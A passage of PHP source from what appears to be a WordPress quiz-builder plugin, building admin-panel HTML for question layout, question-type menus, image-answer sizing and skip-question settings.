$style_ans_image_options = "";	
if($ans_with_img == 'checked'){
$style_ans_image_options = "style='display:block';";	
}

$style_ans_image_size_custom = "style='display:none;'";
$style_ans_image_width = "style='display:none;'";
if($ans_image_size_custom == 'custom' || $ans_image_size_custom == 'cover'){
$style_ans_image_size_custom = "style='display:block;'";
}	
if($ans_image_size_custom == 'custom'){
	$style_ans_image_width = "style='display:block;'";
}

$template8_to_settings_html = '<div class="template8_question_screen_setting_options_wrapper">';
$template8_to_settings_html .= '<div class="template8_question_screen_setting_options">';



$template8_to_settings_html .= '<div class="template8_question_screen_setting_right-side">';

$template8_to_settings_html .= '<div class="template8_question_screen_setting_left-side"><div class="template8_question_screen_setting_hide_show"><span class="sqbHideQuesTemplateImageOuter" style="display: none;"><button class="sqbHideQuesTemplateImage">Hide Image</button></span>';
$template8_to_settings_html .= '<span class="sqbShowQuesTemplateImageOuter" style="display: inline-block;"><button class="sqbShowQuesTemplateImage">Show Image</button></span>';
$hide_button = '<span class="sqbDeleteQuesTemplateImageOuter" style="display: inline-block;"><button class="sqbDeleteQuesTemplateImage">Delete Image</button></span>';
$template8_to_settings_html .= '<span class="sqbHideQuesDescriptionOuter"><button class="sqbHideQuesDescription">Hide Description</button></span>';
$template8_to_settings_html .= '<span class="sqbShowQuesDescriptionOuter" style="display:none"><button class="sqbShowQuesDescription">Show Description</button></span></div>';

$template8_to_settings_html .= '</div>';


$template8_to_settings_html .= '<div class="choose-layout-div template8-choose-layout-section"><div class="dropdown dropdown-custom-style"><button class="dropdown-toggle question-select-layout" type="button" data-value="'.$layout_value.'">'.$layout_text.'<span class="caret"></span></button><ul class="dropdown-menu question_layout_type_list_ul"><li><a href="javascript:void(0)" value="choose_layout">Choose Layout</a></li><li><a href="javascript:void(0)" value="one_column">1 Column</a></li><li><a href="javascript:void(0)" value="two_column">2 Columns</a></li><li><a href="javascript:void(0)" value="three_column" class="column-hide-template9">3 Columns</a></li><li><a class="column-hide-template6"href="javascript:void(0)" value="four_column">4 Columns</a></li><li><a class="column-hide-template6" href="javascript:void(0)" value="five_column">5 Columns</a></li><li><a class="column-hide-template6" href="javascript:void(0)" value="six_column">6 Columns</a></li></ul></div></div>'.$quiz_category_list;

$show_multiple_ans_checked = "";
if($multiple_ans_checked == 'Y'){
	$show_multiple_ans_checked = "checked";
}
$showForMultiple = 'display:none;';
if($question_type == 'multi'){
	$showForMultiple = '';
}

$template8_to_settings_html .= '<div class="question_drop_down_wrapper"> <div class="quiz-content-card question-type-card question_type_wrapper" '.$answer_type_matrix_selected_class.'" style="'.$question_type_option.'"><div class="multile-ans-section">
	
<div class="dropdown dropdown-custom-style" '.$tool_tip_related_style.'> <button class="dropdown-toggle" type="button" data-value="'.$question_type.'">'.$question_images.'<span>'.$question_type_text.'</span></button> <ul class="dropdown-menu question_type_list_ul"> <li><img src="'.plugins_url('').'/smartquizbuilder/includes/images/icons/single-choice.svg"><a href="javascript:void(0)" value="single">Single Choice</a></li> <li><img src="'.plugins_url('').'/smartquizbuilder/includes/images/icons/multiple-choice.svg"><a href="javascript:void(0)" value="multi">Multiple Choice</a></li> <li class="hide_for_poll"><img src="'.plugins_url('').'/smartquizbuilder/includes/images/icons/yes-no.svg"><a href="javascript:void(0)" value="yes_no">Yes/No</a></li> <li class="hide_for_poll"><img src="'.plugins_url('').'/smartquizbuilder/includes/images/icons/text.svg"><a href="javascript:void(0)" value="text">Text</a></li> <li class="hide_for_poll"><img src="'.plugins_url('').'/smartquizbuilder/includes/images/icons/numerical-value.svg"><a href="javascript:void(0)" value="numerical_text">Numerical Value</a></li> <li class="showHideQueTypeOption_assessment_scoring hide_for_poll" style="'.$ques_type_rating.'" ><img src="'.plugins_url('').'/smartquizbuilder/includes/images/icons/rating.svg"><a href="javascript:void(0)" value="rating" >Rating Scale</a></li> <li class="showHideQueTypeOption" style="'.$ques_type_fill.'"><img src="'.plugins_url('').'/smartquizbuilder/includes/images/icons/fill-in-blank.svg"><a href="javascript:void(0)" value="fill_in_blank">Fill In Blank</a></li> <li class="hide_for_poll"><img src="'.plugins_url('').'/smartquizbuilder/includes/images/icons/file-upload.svg"><a href="javascript:void(0)" value="file_upload">File Upload</a></li> <li class="hide_for_poll"><img src="'.plugins_url('').'/smartquizbuilder/includes/images/icons/slider.svg"><a href="javascript:void(0)" value="slider">Slider</a></li> <li class="hide_for_poll"><img src="'.plugins_url('').'/smartquizbuilder/includes/images/icons/matrix.svg"><a href="javascript:void(0)" class="showQueTypeOption_assessment_scorings"  value="matrix" style="" >Matrix</a></li> <li class="showHideQueTypeOption_assessment_scoring hide_for_poll" style="display:none"><img src="'.plugins_url('').'/smartquizbuilder/includes/images/icons/ranking-choice.svg"><a href="javascript:void(0)" value="ranking_choices" >Ranking / Choice</a></li> <li class="hide_for_poll"><img src="'.plugins_url('').'/smartquizbuilder/includes/images/icons/date.svg"><a href="javascript:void(0)" value="date">Date</a></li> <li class="hide_for_poll"><img src="'.plugins_url('').'/smartquizbuilder/includes/images/icons/dropdown.svg"><a href="javascript:void(0)" value="dropdown" >Dropdown</a></li><li class="hide_for_poll"><img src="'.plugins_url('').'/smartquizbuilder/includes/images/icons/complete-the-sentence.svg"><a href="javascript:void(0)" value="matching_text" >Complete the Sentences</a></li><li><img src="'.plugins_url('').'/smartquizbuilder/includes/images/icons/email.svg"><a href="javascript:void(0)" value="email" >Email</a></li><li><img src="'.plugins_url('').'/smartquizbuilder/includes/images/icons/phone-number.svg"><a href="javascript:void(0)" value="phone_number" >Phone Number</a></li><li class="hide_for_poll"><img src="'.plugins_url('').'/smartquizbuilder/includes/images/icons/height.png"><a href="javascript:void(0)" value="weight_and_height" >Weight and Height</a></li><li><img src="'.plugins_url('').'/smartquizbuilder/includes/images/icons/name.png"><a href="javascript:void(0)" value="name" >Name</a></li></ul>'.$answer_type_tool_tip.'</div><div class="sqb_ans_multiple" style="'.$showForMultiple.'">
		<button class="multiple-ques-dropdown" title="Limit" id="dropdownMenuQuestionLimit"> <span> ...</span></button>

		
		<div class="sqb-multiple-ans-options" style="display: none;">
			<div class="sqb-multiple-ans-on-off">
				<div class="checkbox-custom-style">
					<input type="checkbox" class="custom-checkbox-input" name="sqb_multiple_ans_limited" '.$show_multiple_ans_checked.'>
					<span class="custom--checkbox"></span>
				</div> 
				<label>Max allowed answers:</label>
			</div>
			<div class="sqb-que-limit">
				<label for="sqb_multiple_ans_input_limit">Limit to <div class="tool-tip">
								<i class="fa fa-info-circle" aria-hidden="true"></i>
								<div class="toll-tip-desc">Limit the number of answers that users can pick
								</div></div></label>
				<input type="number" min="1" name="sqb_multiple_ans_input_limit" id="sqb_multiple_ans_input_limit" placeholder="Limit" value="'.$sqb_multiple_ans_input_limit.'">
			</div>
		</div>
	</div></div><div class="add_more_rating_btn" style="'.$add_rating_btn_display.'">Add More Ratings</div></div></div>';

$template8_to_settings_html .= '<div class="image-and-skip-section"><div class="sqb_ans_add_image">
								<div class="sqb-image-on-off">
									<div class="checkbox-custom-style">
										<input type="checkbox" class="custom-checkbox-input" name="sqb_ans_with_img_checkbox" '.$ans_with_img.'>
										<span class="custom--checkbox"></span>
									</div> 
									<label>Image Answer</label>

									
								</div>
							
							<div class="sqb-ans-image-options img-answer-'.$ans_with_img.'" '.$style_ans_image_options.'>
								<div class="sqb-image-size-dropdown">
									<select class="ans-image-size-options" name="ans-image-size-options">
										'.$options_data.'
									</select>
								</div>
								<div class="sqb-image-custom-size-option sqb-custom-size-'.$ans_image_size_custom.'" '.$style_ans_image_size_custom.'>
									<div class="sqb-que-img-height-width">
										<div class="sqb-que-img-width" '.$style_ans_image_width.'>
											<label for="sqb_image_custom_width">Width (PX)</label>
											<input type="number" min="80" name="sqb_image_custom_width" id="sqb_image_custom_width" value='.$ans_image_width.'>
										</div>
										<div class="sqb-que-img-height">
											<label for="sqb_image_custom_height">Height (PX)</label>
											<input type="number" min="50" name="sqb_image_custom_height" id="sqb_image_custom_height" value='.$ans_image_height.'>
										</div>
									</div>
								</div>
								<div class="sqb-image-text-on-off">
									<div class="checkbox-custom-style">
										<input type="checkbox" class="custom-checkbox-input custom-checkbox-input-hide-ans-label" name="sqb_ans_show_label" value="Y" '.$ans_show_image_label.'>
										<span class="custom--checkbox"></span>
									</div> 
									<label>Hide answer title in frontend</label>
								</div>
								</div>
					    	</div>
						    <div class="sqb_ans_add_image skip-btn-temp-8">
								<div class="sqb-image-on-off">
									<div class="checkbox-custom-style">
										<input type="checkbox" class="custom-checkbox-input " name="allow_skip_ques" '.$skipChecked.'>
										<span class="custom--checkbox"></span>
									</div> 
									<label>Skip Question? <div class="tool-tip">
								<i class="fa fa-info-circle" aria-hidden="true"></i>
								<div class="toll-tip-desc">Allow students to skip this question if they don\'t want to answer it?
								</div></div></label>
								</div>
							</div>
							</div>
						</div>';
						   								
$template8_to_settings_html .= '</div>';
// $template8_to_settings_html .= $quiz_category_list;
$template8_to_settings_html .= '</div>';
return $template8_to_settings_html;
}

function template8_top_settings_section(){

$quiz_category_list = sqbGetQuizCategoryListHtmlOfQuestionScreen();				
// $template8_to_settings_html .= $quiz_category_list;

$template8_to_settings_html = '<div class="template8_question_screen_setting_options_wrapper">';
$template8_to_settings_html .= '<div class="template8_question_screen_setting_options">';




$template8_to_settings_html .= '<div class="template8_question_screen_setting_right-side">';

$template8_to_settings_html .= '<div class="template8_question_screen_setting_left-side"><div class="template8_question_screen_setting_hide_show"><span class="sqbHideQuesTemplateImageOuter" style="display: none;"><button class="sqbHideQuesTemplateImage">Hide Image</button></span>';
$template8_to_settings_html .= '<span class="sqbShowQuesTemplateImageOuter" style="display: inline-block;"><button class="sqbShowQuesTemplateImage">Show Image</button></span>';
$hide_button = '<span class="sqbDeleteQuesTemplateImageOuter" style="display: inline-block;"><button class="sqbDeleteQuesTemplateImage">Delete Image</button></span>';
$template8_to_settings_html .= '<span class="sqbHideQuesDescriptionOuter"><button class="sqbHideQuesDescription">Hide Description</button></span>';
$template8_to_settings_html .= '<span class="sqbShowQuesDescriptionOuter" style="display:none"><button class="sqbShowQuesDescription">Show Description</button></span></div>';

$template8_to_settings_html .= '</div>';



$template8_to_settings_html .= '<div class="choose-layout-div template8-choose-layout-section"><div class="dropdown dropdown-custom-style"><button class="dropdown-toggle question-select-layout" type="button" data-value="four_column">4 Columns<span class="caret"></span></button><ul class="dropdown-menu question_layout_type_list_ul"><li><a href="javascript:void(0)" value="choose_layout">Choose Layout</a></li><li><a href="javascript:void(0)" value="one_column">1 Column</a></li><li><a href="javascript:void(0)" value="two_column">2 Columns</a></li><li><a href="javascript:void(0)" value="three_column" class="column-hide-template9">3 Columns</a></li><li><a class="column-hide-template6" href="javascript:void(0)" value="four_column">4 Columns</a></li><li><a class="column-hide-template6" href="javascript:void(0)" value="five_column">5 Columns</a></li><li><a class="column-hide-template6" href="javascript:void(0)" value="six_column">6 Columns</a></li></ul></div></div>'.$quiz_category_list;

$template8_to_settings_html .= '<div class="question_drop_down_wrapper"><div class="quiz-content-card question-type-card question_type_wrapper" style=""><div class="multile-ans-section"><div class="dropdown dropdown-custom-style"><button class="dropdown-toggle" type="button" data-value="single"><img src="'.plugins_url('').'/smartquizbuilder/includes/images/icons/single-choice.svg"><span>Single Choice</span></button> <ul class="dropdown-menu question_type_list_ul"> <li><img src="'.plugins_url('').'/smartquizbuilder/includes/images/icons/single-choice.svg"><a href="javascript:void(0)" value="single">Single Choice</a></li> <li><img src="'.plugins_url('').'/smartquizbuilder/includes/images/icons/multiple-choice.svg"><a href="javascript:void(0)" value="multi">Multiple Choice</a></li> <li class="hide_for_poll"><img src="'.plugins_url('').'/smartquizbuilder/includes/images/icons/yes-no.svg"><a href="javascript:void(0)" value="yes_no">Yes/No</a></li> <li class="hide_for_poll"><img src="'.plugins_url('').'/smartquizbuilder/includes/images/icons/text.svg"><a href="javascript:void(0)" value="text">Text</a></li> <li class="hide_for_poll"><img src="'.plugins_url('').'/smartquizbuilder/includes/images/icons/numerical-value.svg"><a href="javascript:void(0)" value="numerical_text">Numerical Value</a></li> <li class="showHideQueTypeOption_assessment_scoring hide_for_poll"><img src="'.plugins_url('').'/smartquizbuilder/includes/images/icons/rating.svg"><a href="javascript:void(0)" value="rating">Rating Scale</a></li> <li class="showHideQueTypeOption" style="display: none;"><img src="'.plugins_url('').'/smartquizbuilder/includes/images/icons/fill-in-blank.svg"><a href="javascript:void(0)" value="fill_in_blank">Fill In Blank</a></li> <li class="hide_for_poll"><img src="'.plugins_url('').'/smartquizbuilder/includes/images/icons/file-upload.svg"><a href="javascript:void(0)" value="file_upload">File Upload</a></li> <li class="hide_for_poll"><img src="'.plugins_url('').'/smartquizbuilder/includes/images/icons/slider.svg"><a href="javascript:void(0)" value="slider">Slider</a></li> <li class="hide_for_poll"><img src="'.plugins_url('').'/smartquizbuilder/includes/images/icons/matrix.svg"><a href="javascript:void(0)" value="matrix" class="showQueTypeOption_assessment_scorings">Matrix</a></li> <li class="showHideQueTypeOption_assessment_scoring hide_for_poll"><img src="'.plugins_url('').'/smartquizbuilder/includes/images/icons/ranking-choice.svg"><a href="javascript:void(0)" value="ranking_choices">Ranking / Choice</a></li> <li class="hide_for_poll"><img src="'.plugins_url('').'/smartquizbuilder/includes/images/icons/date.svg"><a href="javascript:void(0)" value="date">Date</a></li> <li class="hide_for_poll"><img src="'.plugins_url('').'/smartquizbuilder/includes/images/icons/dropdown.svg"><a href="javascript:void(0)" value="dropdown" >Dropdown</a></li><li class="hide_for_poll"><img src="'.plugins_url('').'/smartquizbuilder/includes/images/icons/complete-the-sentence.svg"><a href="javascript:void(0)" value="matching_text" >Complete the Sentences</a></li><li><img src="'.plugins_url('').'/smartquizbuilder/includes/images/icons/email.svg"><a href="javascript:void(0)" value="email" >Email</a></li> <li><img src="'.plugins_url('').'/smartquizbuilder/includes/images/icons/phone-number.svg"><a href="javascript:void(0)" value="phone_number" >Phone Number</a></li><li class="hide_for_poll"><img src="'.plugins_url('').'/smartquizbuilder/includes/images/icons/height.png"><a href="javascript:void(0)" value="weight_and_height" >Weight and Height</a></li><li><img src="'.plugins_url('').'/smartquizbuilder/includes/images/icons/name.png"><a href="javascript:void(0)" value="name" >Name</a></li></ul></div><div class="sqb_ans_multiple" style="display:none;">
		<button class="multiple-ques-dropdown" title="Limit" id="dropdownMenuQuestionLimit"> <span> ...</span></button>

		
		<div class="sqb-multiple-ans-options" style="display: none;">
			<div class="sqb-multiple-ans-on-off">
				<div class="checkbox-custom-style">
					<input type="checkbox" class="custom-checkbox-input" name="sqb_multiple_ans_limited">
					<span class="custom--checkbox"></span>
				</div> 
				<label>Max allowed answers:</label>
			</div>
			<div class="sqb-que-limit">
				<label for="sqb_multiple_ans_input_limit">Limit to <div class="tool-tip">
								<i class="fa fa-info-circle" aria-hidden="true"></i>
								<div class="toll-tip-desc">Limit the number of answers that users can pick
								</div></div></label>
				<input type="number" min="1" name="sqb_multiple_ans_input_limit" id="sqb_multiple_ans_input_limit" placeholder="Limit" value="">
			</div>
		</div>
	</div></div><div class="add_more_rating_btn" style="display:none">Add More Ratings</div></div></div>';

$template8_to_settings_html .= '<div class="image-and-skip-section"><div class="sqb_ans_add_image">
								<div class="sqb-image-on-off">
									<div class="checkbox-custom-style">
										<input type="checkbox" class="custom-checkbox-input" name="sqb_ans_with_img_checkbox">
										<span class="custom--checkbox"></span>
									</div> 
									<label>Image Answer</label>	
								</div>
							
							<div class="sqb-ans-image-options ">
								<div class="sqb-image-size-dropdown">
									<select class="ans-image-size-options" name="ans-image-size-options">
										<option value="cover">Cover Image</option><option value="contain">Contain</option><option value="100_100" data-height="100" data-width="100" selected>100x100</option><option value="200_200" data-height="200" data-width="200">200x200</option><option value="300_300" data-height="300" data-width="300">300x300</option><option value="custom">Custom Size</option>
									</select>
								</div>
								<div class="sqb-image-custom-size-option sqb-custom-size-100_100" style="display:none;">
									<div class="sqb-que-img-height-width">
										<div class="sqb-que-img-width">
											<label for="sqb_image_custom_width">Width (PX)</label>
											<input type="number" min="80" name="sqb_image_custom_width" id="sqb_image_custom_width" value="150">
										</div>
										<div class="sqb-que-img-height">
											<label for="sqb_image_custom_height">Height (PX)</label>
											<input type="number" min="50" name="sqb_image_custom_height" id="sqb_image_custom_height" value="80">
										</div>
									</div>
								</div>
								<div class="sqb-image-text-on-off">
									<div class="checkbox-custom-style">
										<input type="checkbox" class="custom-checkbox-input custom-checkbox-input-hide-ans-label" name="sqb_ans_show_label" value="Y">
										<span class="custom--checkbox"></span>
									</div> 
									<label>Hide answer title in frontend</label>
								</div>
								
							</div>
						   </div><div class="sqb_ans_add_image skip-btn-temp-8">
								<div class="sqb-image-on-off">
									<div class="checkbox-custom-style">
										<input type="checkbox" class="custom-checkbox-input " name="allow_skip_ques">
										<span class="custom--checkbox"></span>
									</div> 
									<label>Skip Question? <div class="tool-tip">
								<i class="fa fa-info-circle" aria-hidden="true"></i>
								<div class="toll-tip-desc">Allow students to skip this question if they don\'t want to answer it?
								</div></div></label>
								</div>
								</div>
							</div></div>';
						   				
$template8_to_settings_html .= '</div>';


$template8_to_settings_html .= '</div>';
return $template8_to_settings_html;
}

function sqbAddMoreQuestions(){
	
	$img_url = plugins_url('').'/smartquizbuilder/includes/images/sqb_quiz.png';
	$quiz_category_list = sqbGetQuizCategoryListHtmlOfQuestionScreen();
	
	$ans_image_options = array(
						   	'cover' => 'Cover Image',
						   	'contain' => 'Contain',
						   	'100_100' => '100x100',
						   	'200_200' => '200x200',
						   	'300_300' => '300x300',
						   	'custom' => 'Custom Size',
						   );
	$options_data = '';
	foreach ($ans_image_options as $image_options_key => $image_options_value) {
	$height_width = explode('_', $image_options_key);
	$data_attr = '';
	if(!empty($height_width)){
		if($image_options_key != 'cover' && $image_options_key != 'custom'){
			if (array_key_exists("0",$height_width) && array_key_exists("1",$height_width)){
				$data_attr = 'data-height="'.$height_width[0].'" data-width="'.$height_width[1].'"';
			}
		}
	}
	
	$options_data.='<option value="'.$image_options_key.'" '.$data_attr.'>'.$image_options_value.'</option>';
	}

	$html  = '
			<div class="question_div_outer" id="%%CURRENTDATETIMEMAINDIV%%">
				
				<input type="hidden" name="question_temp_name" value="standard">
				<input type="hidden" name="question_temp_no" value="template1">
				<input type="hidden" name="question_file_upload_settings" value="">
				<input type="hidden" name="enable_question_background_image" value="N">
				<input type="hidden" name="question_background_image" value="">
				<input type="hidden" name="progress_bar_color" value="#000">
				<div class="question_div_inner"  style=" position: relative;">
				 '.template8_top_settings_section().'
					<div class="question-screen">
					<div class="Quiz-Template  quiz_comon_template sqb_question_enable_drag_drop" data-id="%%SQBQUESTIONID%%">
					<div class="sqbv2-template8-question-screen-inside">
					  <div class="question_details">
					  	
						<div class="sqb_question_drag_drop_item question_title sqb_tiny_mce_editor_rename Quiz-Template-title"><div>Enter Your Question Here </div></div>
							<span class="sqbHideQuesTemplateImageOuter"><button class="sqbHideQuesTemplateImage">Hide Image</button></span>
							<span class="sqbShowQuesTemplateImageOuter" style="display:none"><button class="sqbShowQuesTemplateImage">Show Image</button></span>
							<span class="sqbDeleteQuesTemplateImageOuter"><button class="sqbDeleteQuesTemplateImage">Delete Image</button></span>
							<span class="sqbAddQuesTemplateImageOuter" style="display:none"><button class="sqbAddQuesTemplateImage" attr-img-src="'.$img_url.'">Add Image</button></span>
							
						<div class="sqb_question_drag_drop_item question_img_div Quiz-Template-image" id="%%CURRENTDATETIMEIMAAOUTER%%">
						
							<img class="sqb_img_draggable %%CURRENTDATETIMEIMG%%" src="'.$img_url.'">
							<span data-class="%%CURRENTDATETIMEIMG%%" class="question_img_upload sbq_change_img"><i class="fa fa-camera" aria-hidden="true"></i></span>
						</div>
						<div class="video-element-outer questionTemplateVideoOuter" data-type="outcome" style="display:none">
							<input type="hidden" class="question_video_url" value="">
							<input type="hidden" class="question_show_video" value="N">
							<input type="hidden" class="question_video_link_type" value="0">
							<input type="hidden" class="question_video_link_type_text" value="Source">
							<input type="hidden" class="question_video_aspect" value="1">

							<a href="javascript:void(0)" class="questionTemplateVideoOuterLinkOver insertOutcomeVideo"  data-type="question" >1</a>
							<div class="video-add-link questionTemplateInsertVideoOuter" style="display:none">
								<a href="javascript:void(0)" class="insertQuestionVideo"  data-type="question" ><i class="fa fa-file-video-o" aria-hidden="true"></i> Insert Video</a>
							</div>
							<div class="yt-videoWrapper questionTemplateYoutubeVideoOuter" style="display:none">
								<iframe width="560" height="315" src="" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>
							</div>
							<div class="external-videoWrapper questionTemplateCommonVideoOuter" style="display:none">
								<video width="400" controls>
								</video>
							</div>
						</div>
						<span class="sqbHideQuesDescriptionOuter"><button class="sqbHideQuesDescription">Hide Description</button></span>
						<span class="sqbShowQuesDescriptionOuter" style="display:none"><button class="sqbShowQuesDescription">Show Description</button></span>
						<div class="sqb_question_drag_drop_item Quiz-Template-content question_description sqb_tiny_mce_editor_rename">
							<div>Enter any additional information about the quiz</div>
						</div>
                       </div> 
                        <div class="ans_layout_div">
                        	<div class="answer-view-options">
                        		<label>Choose layout:</label>
								<div class="sqb_ans_layout_standard selected-op ans_layout_typw "><i class="fa fa-bars" aria-hidden="true"></i></div>
								<div class="sqb_ans_layout_mulitple ans_layout_typw"><i class="fa fa-th-large" aria-hidden="true"></i></div>
								<div class="sqb_ans_layout_three_in_row ans_layout_typw"><i class="fa fa-th" aria-hidden="true"></i></div>
							</div>
							<div class="sqb_ans_add_image">
								<div class="sqb-image-on-off">
									<div class="checkbox-custom-style">
										<input type="checkbox"  class="custom-checkbox-input" name="sqb_ans_with_img_checkbox">
										<span class="custom--checkbox"></span>
									</div> 
									<label>Image Answer</label>

									<div class="dropdown-link-style dropdown">
										<button class="dropdown-toggle" type="button" id="dropdownMenuButton" data-toggle="dropdown" aria-haspopup="true" aria-expanded="true"> <span> ...</span></button>
										<div class="dropdown-menu" aria-labelledby="dropdownMenuButton">
											<a class="dropdown-item" href="#" style="display:none">
												<div class="checkbox-custom-style"  >
												<input type="checkbox" class="custom-checkbox-input " name="multiple_correct_ans">
												<span class="custom--checkbox"></span>
												</div> Show Multiple Correct Answers
												</a>
											<a class="dropdown-item" href="#"><div class="checkbox-custom-style">
												<input type="checkbox" class="custom-checkbox-input " name="allow_skip_ques">
												<span class="custom--checkbox"></span>
												</div> Allow students to skip questions
											</a>	
											<a class="dropdown-item delete-qa-row" style="display:none" >Delete Question</a>
										</div>
									</div>
								</div>
							
							<div class="sqb-ans-image-options ">
								<div class="sqb-image-size-dropdown">
									<select class="ans-image-size-options" name="ans-image-size-options">
										'.$options_data.'
									</select>
								</div>
								<div class="sqb-image-custom-size-option sqb-custom-size-cover">
									<div class="sqb-que-img-height-width">
										<div class="sqb-que-img-width">
											<label for="sqb_image_custom_width">Width (PX)</label>
											<input type="number" min="80" name="sqb_image_custom_width" id="sqb_image_custom_width" value="150">
										</div>
										<div class="sqb-que-img-height">
											<label for="sqb_image_custom_height">Height (PX)</label>
											<input type="number" min="80" name="sqb_image_custom_height" id="sqb_image_custom_height" value="150">
										</div>
									</div>
								</div>
								<div class="sqb-image-text-on-off">
									<div class="checkbox-custom-style">
										<input type="checkbox" class="custom-checkbox-input custom-checkbox-input-hide-ans-label" name="sqb_ans_show_label" value="Y">
										<span class="custom--checkbox"></span>
									</div> 
									<label>Hide answer title in frontend</label>
								</div>
								
							</div>
						   </div>
						</div>
						<div class="skip-questions-div template7-skip-question-button">
							<div class="checkbox-custom-style">
								<input type="checkbox" class="custom-checkbox-input" name="skipquestion">
								<span class="custom--checkbox"></span>
							</div> 
							<label>Allow Skip?</label>
						</div>
						
						<div class="choose-layout-div template7-choose-layout-section">
						   <label class="">Choose Layout</label>
						   <div class="dropdown dropdown-custom-style">
							   <button class="dropdown-toggle question-select-layout" type="button" data-value="four_column">4 Columns<span class="caret"></span></button>
							   <ul class="dropdown-menu question_layout_type_list_ul">
								   <li><a href="javascript:void(0)" value="one_column">1 Column</a></li>
								   <li><a href="javascript:void(0)" value="two_column">2 Columns</a></li>
								   <li><a class="column-hide-template9" href="javascript:void(0)" value="three_column">3 Columns</a></li>
								   <li><a class="column-hide-template6" href="javascript:void(0)" value="four_column">4 Columns</a></li>
								   <li><a class="column-hide-template6" href="javascript:void(0)" value="five_column">5 Columns</a></li>
								   <li><a class="column-hide-template6" href="javascript:void(0)" value="six_column">6 Columns</a></li>
							   </ul>
						   </div>
						</div>
						<div class="question_drop_down_wrapper">
                        <div class="quiz-content-card question-type-card question_type_wrapper " style="display:none">
									<label  class="quiz_label">Question  Type</label>
									<div class="multile-ans-section">
									<div class="dropdown dropdown-custom-style">
										<!--<button class="dropdown-toggle" type="button" data-toggle="dropdown" data-value="multi">Multiple Choice
										<span class="caret"></span></button>-->
										<button class="dropdown-toggle" type="button"   data-value="single"><img src="'.plugins_url('').'/smartquizbuilder/includes/images/icons/single-choice.svg">Single Choice</button>
										<ul class="dropdown-menu question_type_list_ul">
											<li><img src="'.plugins_url('').'/smartquizbuilder/includes/images/icons/single-choice.svg"><a href="javascript:void(0)" value="single" >Single Choice</a></li>
											<li><img src="'.plugins_url('').'/smartquizbuilder/includes/images/icons/multiple-choice.svg"><a href="javascript:void(0)" value="multi" >Multiple Choice</a></li>
											<li class="hide_for_poll"><img src="'.plugins_url('').'/smartquizbuilder/includes/images/icons/yes-no.svg"><a href="javascript:void(0)" value="yes_no" >Yes/No</a></li>
											<li class="hide_for_poll"><img src="'.plugins_url('').'/smartquizbuilder/includes/images/icons/text.svg"><a href="javascript:void(0)" value="text" >Text</a></li>
											<li class="hide_for_poll"><img src="'.plugins_url('').'/smartquizbuilder/includes/images/icons/numerical-value.svg"><a href="javascript:void(0)" value="numerical_text" >Numerical Value</a></li>
											<li class="showHideQueTypeOption_assessment_scoring"><img src="'.plugins_url('').'/smartquizbuilder/includes/images/icons/rating.svg"><a href="javascript:void(0)" value="rating" >Rating Scale</a></li>
											
											<li class="showHideQueTypeOption"><img src="'.plugins_url('').'/smartquizbuilder/includes/images/icons/fill-in-blank.svg"><a href="javascript:void(0)" value="fill_in_blank" >Fill In Blank</a></li>
											<li class="hide_for_poll"><img src="'.plugins_url('').'/smartquizbuilder/includes/images/icons/file-upload.svg"><a href="javascript:void(0)" value="file_upload" >File Upload</a></li>
											<li class="hide_for_poll"><img src="'.plugins_url('').'/smartquizbuilder/includes/images/icons/slider.svg"><a href="javascript:void(0)" value="slider" >Slider</a></li>
											<li class="hide_for_poll"><img src="'.plugins_url('').'/smartquizbuilder/includes/images/icons/matrix.svg"><a href="javascript:void(0)" value="matrix" class="showQueTypeOption_assessment_scorings"  >Matrix</a></li>
											<li class="showHideQueTypeOption_assessment_scoring"><img src="'.plugins_url('').'/smartquizbuilder/includes/images/icons/ranking-choice.svg"><a href="javascript:void(0)" value="ranking_choices">Ranking / Choice</a></li>
											<li class="hide_for_poll"><img src="'.plugins_url('').'/smartquizbuilder/includes/images/icons/date.svg"><a href="javascript:void(0)" value="date" >Date</a></li>
											<li class="hide_for_poll"><img src="'.plugins_url('').'/smartquizbuilder/includes/images/icons/dropdown.svg"><a href="javascript:void(0)" value="dropdown" >Dropdown</a></li>
											<li class="hide_for_poll"><img src="'.plugins_url('').'/smartquizbuilder/includes/images/icons/complete-the-sentence.svg"><a href="javascript:void(0)" value="matching_text" >Complete the Sentences </a></li>
                                            <li><img src="'.plugins_url('').'/smartquizbuilder/includes/images/icons/email.svg"><a href="javascript:void(0)" value="email" >Email</a></li>
											<li><img src="'.plugins_url('').'/smartquizbuilder/includes/images/icons/phone-number.svg"><a href="javascript:void(0)" value="phone_number" >Phone Number</a></li>
											<li class="hide_for_poll"><img src="'.plugins_url('').'/smartquizbuilder/includes/images/icons/height.png"><a href="javascript:void(0)" value="weight_and_height" >Weight and Height</a></li>
											<li><img src="'.plugins_url('').'/smartquizbuilder/includes/images/icons/name.png"><a href="javascript:void(0)" value="name" >Name</a></li>
											</li>
										</ul>
									</div>
									<div class="sqb_ans_multiple" style="display:none;">
										<button class="multiple-ques-dropdown" title="Limit" id="dropdownMenuQuestionLimit"> <span> ...</span></button>

										
										<div class="sqb-multiple-ans-options" style="display: none;">
											<div class="sqb-multiple-ans-on-off">
												<div class="checkbox-custom-style">
													<input type="checkbox" class="custom-checkbox-input" name="sqb_multiple_ans_limited">
													<span class="custom--checkbox"></span>
												</div> 
												<label>Max allowed answers:</label>
											</div>
											<div class="sqb-que-limit">
												<label for="sqb_multiple_ans_input_limit">Limit to <div class="tool-tip">
																<i class="fa fa-info-circle" aria-hidden="true"></i>
																<div class="toll-tip-desc">Limit the number of answers that users can pick
																</div></div></label>
												<input type="number" min="1" name="sqb_multiple_ans_input_limit" id="sqb_multiple_ans_input_limit" placeholder="Limit" value="">
											</div>
										</div>
									</div>
									</div>
                                    <div class="add_more_rating_btn" style="display:none">Add More Ratings</div>

								</div>
								'.$quiz_category_list.'
								
						</div>		
                        <div class="question_rating_lable_div sqb_question_drag_drop_item rating_info" style="display:none">
							<div class="question_rating_lable_div_inner question_rating_lable_low rating_info_left">
								
								<label class="quiz_label">Low Score Label</label>
								<div class="sqb_tiny_mce_editor_rename question_rating_lable_low_text"><div>Strongly Disagree</div></div>
							</div>
							<div class="question_rating_lable_div_inner question_rating_lable_high rating_info_right">
								
								<label class="quiz_label">High Score Label</label>
								<div class="sqb_tiny_mce_editor_rename question_rating_lable_high_text"><div>Strongly Agree</div></div>
							</div>
						</div>
						<div class="question_add_answer_outer_div sqb_question_drag_drop_item ">
						</div>
						<div class="skip_continue_button_wrapper">
							
						</div>
						</div>
						
					</div>
					</div>
					
					<div class="sqb_add_more_question_section">
						<div class="question_add_answer_btn_div sqb_question_drag_drop_item">
